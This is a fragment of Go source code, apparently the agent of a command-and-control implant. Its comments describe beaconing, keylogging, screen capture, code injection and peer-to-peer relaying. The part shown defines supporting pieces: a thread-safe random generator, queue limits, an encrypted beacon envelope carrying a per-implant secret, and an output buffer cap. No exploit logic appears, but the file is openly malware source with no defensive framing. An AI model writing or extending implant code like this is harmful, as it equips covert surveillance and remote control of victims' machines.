//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	mathRand "math/rand"
	"sync"
)

// lockedRand is a mutex-guarded *mathRand.Rand. The agent reads/writes rng from
// several goroutines concurrently (beacon sender, screenshot stream, injection,
// scheduler, sleep variator), and *mathRand.Rand is not safe for concurrent use.
type lockedRand struct {
	mu sync.Mutex
	r  *mathRand.Rand
}

const (
	// maxPendingResults bounds the in-memory result queue. A high-volume
	// producer (keylogger, screen capture, relayed frames) cannot grow memory
	// without bound; when full the oldest result is dropped.
	maxPendingResults = 1024
	// maxPendingResultBytes drops a single oversized result (e.g. a multi-MB
	// screenshot) outright so it cannot produce a beacon the server rejects.
	maxPendingResultBytes = 16 * 1024 * 1024
	// maxP2PChildFrames / maxP2PChildFrameBytes bound the per-child relay queue.
	maxP2PChildFrames     = 256
	maxP2PChildFrameBytes = 8 * 1024 * 1024
)

// v2Envelope is the top-level transport envelope (mirrors the server's
// beaconEnvelope field layout). SecretID is the v3 per-implant secret id,
// carried only on registration frames.
type v2Envelope struct {
	UUID        string `json:"uuid"`
	Seq         uint64 `json:"seq,omitempty"`
	Ts          int64  `json:"ts,omitempty"`
	ECDHPub     string `json:"ecdh_pub,omitempty"`
	CipherB64   string `json:"c,omitempty"`
	Mac         string `json:"mac,omitempty"`
	IdentityPub string `json:"id_pub,omitempty"`
	RegHMAC     string `json:"reg_hmac,omitempty"`
	SecretID    string `json:"secret_id,omitempty"`
}

const maxOutputSize = 8 * 1024 * 1024

// limitWriter caps how much command output is buffered so a runaway command
// (e.g. an unbounded log dump) cannot exhaust agent memory; bytes past the
// limit are discarded and the truncation is flagged for the final result.
type limitWriter struct {
	w         *bytes.Buffer
	n         int
	limit     int
	truncated bool
}
